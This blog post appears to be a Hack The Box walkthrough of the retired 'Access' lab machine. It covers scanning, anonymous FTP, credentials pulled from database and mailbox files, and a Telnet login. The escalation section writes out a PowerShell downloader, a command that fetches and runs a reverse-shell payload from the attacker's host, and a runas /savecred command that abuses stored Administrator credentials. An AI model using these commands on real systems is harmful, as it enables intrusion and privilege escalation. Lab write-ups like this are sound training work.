---
layout: post
title: "Access: Hack The Box Walkthrough"
date: 2019-03-03 04:43:45 +0000
last_modified_at: 2019-03-03 04:43:52 +0000
category: Walkthrough
tags: ["Hack The Box", Access, retired]
comments: true
image:
  feature: access-htb-walkthrough.jpg
  credit: Pexels / Pixabay
  creditlink: https://pixabay.com/en/dark-door-door-handle-light-open-1852985/
---

This post documents the complete walkthrough of Access, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Access is an active vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.98 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-09 10:37:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
```

`masscan` finds three open ports: `21/tcp`, `23/tcp` and `80/tcp`. Let's do one better with `nmap` scanning these discovered ports.

```
# nmap -n -v -Pn -p21,23,80 -A --reason -oN nmap.txt 10.10.10.98
...
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet? syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
```

Since anonymous FTP is allowed, let's check it out first.

<a class="image-popup">
![ee418d6f.png](/assets/images/posts/access-htb-walkthrough/ee418d6f.png)
</a>

There's a huge file in the `Backups` directory—`backup.mdb`. It appears to be a Microsoft Access Jet Database (MDB) file.

<a class="image-popup">
![0ce46389.png](/assets/images/posts/access-htb-walkthrough/0ce46389.png)
</a>

There's also a big file—`Access Control.zip`, in the `Engineers` directory.

<a class="image-popup">
![ea05e083.png](/assets/images/posts/access-htb-walkthrough/ea05e083.png)
</a>

The archive file is password-protected and it appears to contain a Personal Storage Table (PST) file in it.

### Microsoft Office

I know there are Linux tools to read MDB and PST files but for the sake of convenience, let's use Microsoft Office to open them. I'll use Microsoft Access to read the MDB file. Here's what I found in the `auth_user` table.

<a class="image-popup">
![access.png](/assets/images/posts/access-htb-walkthrough/access.png)
</a>

The password `access4u@security` is the one to extract the PST file from the archive. I'll use Microsoft Outlook to read the PST file. There's only one email in the mailbox.

<a class="image-popup">
![outlook.png](/assets/images/posts/access-htb-walkthrough/outlook.png)
</a>

Another credential (`security:4Cc3ssC0ntr0ller`) in the bag!

### Telnet

Let's give the credential a shot with the Telnet service.

<a class="image-popup">
![16c6c1e1.png](/assets/images/posts/access-htb-walkthrough/16c6c1e1.png)
</a>

Awesome.

The file `user.txt` is at `security`'s desktop.

<a class="image-popup">
![0c8d6cb5.png](/assets/images/posts/access-htb-walkthrough/0c8d6cb5.png)
</a>

### Privilege Escalation

Telnet is painfully slow. Let's run a reverse shell in PowerShell. First of all, let's write a `wget` script in PowerShell. Note that this system is running Windows Server 2008. As such, only PowerShell 2.0 is available. Echo the following lines to `C:\Users\security\Downloads\wget.ps1`.

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($Args[0],$Args[1])
```

<a class="image-popup">
![7638e0eb.png](/assets/images/posts/access-htb-walkthrough/7638e0eb.png)
</a>

Next, generate a reverse shell in PowerShell with `msfvenom` like so.

<a class="image-popup">
![bfe9f363.png](/assets/images/posts/access-htb-walkthrough/bfe9f363.png)
</a>

Run the following commands in the `telnet` session to transfer `rev.ps1` over.

```
powershell -ExecutionPolicy Bypass -File wget.ps1 http://10.10.12.246/rev.ps1 rev.ps1
```

Now, we can execute the reverse shell with the following command.

```
powershell -ExecutionPolicy Bypass -NoExit -File rev.ps1
```

The `-NoExit` switch indicates that we don't want to exit from the thread. We should get a reverse shell in our `nc` listener.

<a class="image-popup">
![5f59bc8d.png](/assets/images/posts/access-htb-walkthrough/5f59bc8d.png)
</a>

During enumeration of `security`'s account, I ran the `cmdkey` command to list the stored credentials in the box and this is what I saw.

<a class="image-popup">
![d1e7b1c4.png](/assets/images/posts/access-htb-walkthrough/d1e7b1c4.png)
</a>

Perfect. This means that I can use the `/savecred` switch in `runas` to impersonate Administrator without knowing the password! Now, let's claim the prize with the following command:

```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Downloads\root.txt"
```

<a class="image-popup">
![6874f21f.png](/assets/images/posts/access-htb-walkthrough/6874f21f.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/156
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
